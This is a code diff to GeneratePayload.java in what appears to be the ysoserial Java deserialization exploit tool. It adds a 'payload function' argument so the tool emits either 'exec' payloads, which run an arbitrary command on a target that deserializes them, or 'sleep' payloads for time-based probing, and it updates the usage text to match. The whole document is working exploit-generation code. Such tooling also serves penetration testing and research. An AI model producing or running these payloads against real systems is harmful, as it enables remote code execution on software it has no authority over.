@@ -19,12 +19,13 @@ public class GeneratePayload {
 	private static final int USAGE_CODE = 64;
 
 	public static void main(final String[] args) {
-		if (args.length != 2) {
+		if (args.length != 3) {
 			printUsage();
 			System.exit(USAGE_CODE);
 		}
 		final String payloadType = args[0];
-		final String command = args[1];
+		final String payloadFunction = args[1];
+		final String command = args[2];
 		
 		final Class<? extends ObjectPayload> payloadClass = getPayloadClass(payloadType);
 		if (payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass)) {
@@ -35,9 +36,24 @@ public class GeneratePayload {
 		
 		try {
 			final ObjectPayload payload = payloadClass.newInstance();
-			final Object object = payload.getObject(command);
-			final ObjectOutputStream objOut = new ObjectOutputStream(System.out);
-			objOut.writeObject(object);
+			
+			if(payloadFunction.equals("exec")) {
+				final Object object = payload.getObjectExec(command);
+				final ObjectOutputStream objOut = new ObjectOutputStream(System.out);
+				objOut.writeObject(object);
+			} else if(payloadFunction.equals("sleep")){
+				if(!payloadType.equals("Groovy1")) {
+					final Object object = payload.getObjectSleep(command);
+					final ObjectOutputStream objOut = new ObjectOutputStream(System.out);
+					objOut.writeObject(object);
+				} else {
+					System.err.println("Not implemented. Groovy1 has only exec payload for now.");
+				}
+			} else {
+				printUsage();
+				System.exit(USAGE_CODE);				
+			}
+			
 		} catch (Throwable e) {
 			System.err.println("Error while generating or serializing payload");
 			e.printStackTrace();
@@ -62,7 +78,7 @@ public class GeneratePayload {
 	
 	private static void printUsage() {
 		System.err.println("Y SO SERIAL?");
-		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'");
+		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload type] [payload function] '[command to execute or time to sleep in milliseconds]'");
 		System.err.println("\tAvailable payload types:");	
 		final List<Class<? extends ObjectPayload>> payloadClasses = 
 			new ArrayList<Class<? extends ObjectPayload>>(getPayloadClasses());
@@ -70,6 +86,9 @@ public class GeneratePayload {
 		for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
 			System.err.println("\t\t" + payloadClass.getSimpleName());
 		}
+		System.err.println("\tAvailable payload functions:");
+		System.err.println("\t\texec");
+		System.err.println("\t\tsleep");
 	}
 	
 	// get payload classes by classpath scanning
